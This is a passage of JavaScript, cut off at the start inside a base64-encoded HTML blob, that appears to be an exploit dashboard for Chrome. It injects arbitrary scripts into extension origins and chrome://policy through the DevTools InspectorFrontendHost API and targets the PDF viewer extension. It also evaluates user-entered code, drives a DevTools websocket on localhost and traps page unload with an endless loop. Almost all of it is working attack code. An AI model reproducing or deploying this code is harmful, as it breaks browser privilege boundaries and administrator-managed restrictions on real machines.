Bmb250LXdlaWdodDogYm9sZGVyOwogICAgICAgICAgICBib3R0b206IDVweDsKICAgICAgICAgICAgcmlnaHQ6IDVweDsKICAgICAgICAgICAgei1pbmRleDogOTk7CiAgICAgICAgICAgIGNvbG9yOiAjZjhmYWZjOwogICAgICAgIH0KICAgIDwvc3R5bGU+CgogICAgPHNjcmlwdCBkZWZlcj4KICAgICAgICBkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJrZXlkb3duIiwgZnVuY3Rpb24gKGV2ZW50KSB7CiAgICAgICAgICAgIGlmIChldmVudC5rZXkgPT09ICJxIikgewogICAgICAgICAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImV4dGRiZyIpLmNsaWNrKCk7CiAgICAgICAgICAgIH0gZWxzZSBpZiAoZXZlbnQua2V5ID09PSAibSIpIHsKICAgICAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJkZXZkYmciKS5jbGljaygpOwogICAgICAgICAgICB9IGVsc2UgaWYgKFsiMSIsICIyIiwgIjMiLCAiNCIsICI1IiwgIjYiLCAiNyIsICI4IiwgIjkiXS5pbmNsdWRlcyhldmVudC5rZXkpKSB7CiAgICAgICAgICAgICAgICBkb2N1bWVudAogICAgICAgICAgICAgICAgICAgIC5xdWVyeVNlbGVjdG9yKGBwIC5oYXJkY29kZWQ6bnRoLWNoaWxkKCR7cGFyc2VJbnQoZXZlbnQua2V5KX0pYCkKICAgICAgICAgICAgICAgICAgICAuY2xpY2soKTsKICAgICAgICAgICAgfQogICAgICAgIH0pOwogICAgPC9zY3JpcHQ+CjwvYm9keT4KPC9odG1sPgo=`));
            document.querySelector('#activate').onclick = function () {
                dbgext(false, pdfId);
            }
            onunload = function () {
                while (true);
            }
            document.close();
            document.title = "Dashboard";
            document.querySelector('#activate2').onclick = function (ev) {

                function xd(w) {
                    w.close();
                    const pdfId = "mhjfbmdgcfjbbpaeojofohoefgiehjai"; // Redefinition because we convert this function to a string
                    const mojoURL = "chrome://resources/mojo/mojo/public/js/bindings.js";
                    chrome.tabs.getCurrent(function (tab) {
                        console.log(tab);
                        chrome.windows.create({ url: mojoURL, setSelfAsOpener: true }, function (info) {
                            async function createAndWriteFile() {
                                function writeFile(filename, content) {
                                    return new Promise((resolve) => {
                                        webkitRequestFileSystem(TEMPORARY, 2 * 1024 * 1024, function (fs) {
                                            fs.root.getFile(filename, { create: true }, function (entry) {
                                                entry.remove(function () {
                                                    fs.root.getFile(filename, { create: true }, function (entry) {
                                                        entry.createWriter(function (writer) {
                                                            writer.write(new Blob([content]))
                                                            writer.onwriteend = function () {
                                                                resolve(entry.toURL());
                                                            }
                                                        })
                                                    })
                                                })
                                            })
                                        })
                                    })

                                }
                                const htmlFile = `<html>
                                <head></head><body><iframe src="filesystem:chrome://extensions/temporary/nothing.html"></iframe>
                                </html>
                                <script>
                                onerror=  alert;
                                if (top !== window) {
                                    top.location.replace(location.href);
                                };
                                </script>
                                `
                                
                                // alert(url);
                                opener.postMessage({ url: (await writeFile('index.html', htmlFile))}, '*');
                                setTimeout(function () {
                                    close();
                                }, 800);
                            }
                            chrome.tabs.executeScript(info.tabs[0].id, { code: `(${createAndWriteFile.toString()})()` });
                            function m2(url) {
                                // alert(url);
                                onmessage = function (data) {
                                    if (data.data.type === "ack") {
                                        
                                        // chrome.tabs.getCurrent(function (tab) {
                                            // alert("navigating");
                                            top.location.replace("")
                                        // })
                                    }
                                }
                                top.postMessage({ type: 'acc' }, '*');
                            }
                            onmessage = function (dat) {
                                if (dat.data.url) {
                                    m2(dat.data.url);
                                }
                            };
                        })
                    })

                }
                dbgext(false, pdfId, xd.toString());
            }
            onmessage = function (ev) {
                if (ev.data.type === "browserInitNavigate") {
                    alert(1);
                    ev.source.location.replace(ev.data.url);
                }
            }
            document.querySelector('#updater').onclick = function (ev) {
                onunload = null;
                const ws = new WebSocket("ws://localhost:8080");

                ws.onopen = function () {
                    ws.onmessage = function (ev) {
                        const received = JSON.parse(ev.data);
                        const savedURL = received.params.request.url;
                        ws.close();
                        const w = open('', '_blank');
                        console.log(savedURL);
                        w.eval(`setTimeout(function () {opener.open(atob("${btoa(savedURL)}"), '_blank'); window.close()}, 500);`);
                        setTimeout(() => { location.reload() });
                    }
                    ws.send(JSON.stringify({
                        method: "Target.setDiscoverTargets",
                        id: 999,
                        params: {}
                    }));
                }

            }
            onmessage = function (d) {
                if (d.data.type === "acc") {
                    onunload = function () { while (true); };
                    d.source.postMessage({ type: "ack" }, '*');
                    
                };

                if (!globalMap[d.data.uid]) return;

                for (const frame of globalMap) {
                    if (!frame) continue;
                    if (frame.idx === d.data.uid) {
                        frame.remove();
                        delete globalMap[globalMap.indexOf(frame)];
                        return;
                    }
                }
            }
            function dbgext(cleanup, id, payload) {
                let x = id;
                while (!x) {
                    x = prompt('Extension id?');
                    if (x === "cancel") {
                        return;
                    }
                }
                let path = 'manifest.json';
                let is_pdf = false;
                let injected = payload ?? payload_swamp.toString();
                if (x === pdfId) {
                    path = "index.html"; // pdf viewer hack
                    is_pdf = true;
                    const b = prompt("code to execute!");
                    if (!b) return;
                    injected = injected.replace('%%CHROMEPAYLOAD%%', btoa(b));
                    InspectorFrontendHost.setInjectedScriptForOrigin('chrome://policy', b+'//');
                    
                }
                const URL_1 = `chrome-extension://${x ??
                    alert("NOTREACHED")}/${path}`;
                InspectorFrontendHost.setInjectedScriptForOrigin(new URL(URL_1).origin, `window.cleanup = ()=>{window.parent.postMessage({type: "remove", uid: window.sys.passcode}, '*');} ;onmessage = function (data) {window.sys = data.data; const w = open(origin + '/${path}'); w.onload = function () {(${injected})(w, data.data)} }//`);
                const ifr = document.createElement("iframe");
                ifr.src = URL_1;
                document.body.appendChild(ifr);
                const ifrid = globalMap.push(ifr) - 1;
                ifr.idx = ifrid;
                ifr.onload = function () {

                    ifr.contentWindow.postMessage({
                        type: "uidpass", passcode:
                            ifrid,
                        cleanup: cleanup
                    }, '*');
                    // console.log('hi');
                }
                // alert(1);

            }
            document.querySelector('#extdbg').onclick = function () {
                dbgext(false);
            }
            document.querySelectorAll('.hardcoded').forEach(el => {el.onclick = function () {
                let extid = el.getAttribute("ext");
                console.log(el.innerText, extid);
                dbgext(false, extid);
                }
            });
            document.querySelector('#cleanup').onclick = function () {
                dbgext(true);
            }
            document.querySelector('#devdbg').onclick = function () {
                var l_canceled = false;
                const id = setTimeout(function m() {
                    if (l_canceled) return;
                    (new Function(prompt("Evaluate script! (type 'cancel' to cancel)")))();
                    if (!l_canceled) setTimeout(m, 0);
                    clearTimeout(id);
                });
                Object.defineProperty(window, 'cancel', {
                    get: function () {
                        l_canceled = true;
                    }, configurable: true
                })
                return;
            }
            console.log(globalMap);
        }
        w.eval(`(${ui.toString()})()`);
        window.close();

    }

    function sleep(ms) {
        return new Promise(resolve => {
            setTimeout(resolve, ms);
        });
    }
}))()